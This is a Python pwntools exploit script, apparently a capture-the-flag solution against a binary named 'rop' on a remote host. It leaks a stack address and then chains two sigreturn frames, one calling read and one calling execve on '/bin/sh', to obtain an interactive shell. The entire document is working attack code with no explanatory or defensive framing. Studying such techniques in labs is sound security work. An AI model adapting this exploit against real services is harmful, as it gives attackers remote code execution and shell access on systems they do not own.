from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
#io = process('./rop')
io = remote("192.168.250.223",12340)

syscall_ret = 0x00000000004004e7
start_addr = 0x00000000004004da


payload = p64(start_addr) * 3       
io.send(payload)
io.send(b'\xdc')                   
pause()
stack_addr = u64(io.recv()[8:16])  
print("stack addr:",stack_addr)

sigframe = SigreturnFrame()       
print("sigframe;",type(sigframe))
sigframe.rax = constants.SYS_read 
sigframe.rdi = 0                  
sigframe.rsi = stack_addr         
sigframe.rdx = 0x400              
sigframe.rsp = stack_addr         
sigframe.rip = syscall_ret        

input()
payload = p64(start_addr) + b'a' * 8 + bytes(sigframe)  

input()
io.send(payload)

psigreturn = p64(syscall_ret) + b'b' * 7               
input()

io.send(psigreturn)                 
input()

sigframe_t = SigreturnFrame()       
sigframe_t.rax = constants.SYS_execve
sigframe_t.rdi = stack_addr + 0x120  
sigframe_t.rsi = 0x0
sigframe_t.rdx = 0x0
sigframe_t.rsp = stack_addr          
sigframe_t.rip = syscall_ret        
frame_payload = p64(start_addr) + b"b"*8 + bytes(sigframe_t)    
print("frame_len:",len(frame_payload))
payload = frame_payload + (0x120 - len(frame_payload)) * b"\x00" + b"/bin/sh\x00" 

input()
io.send(payload)                        

input()
io.send(psigreturn)                                                              

input()

io.interactive()
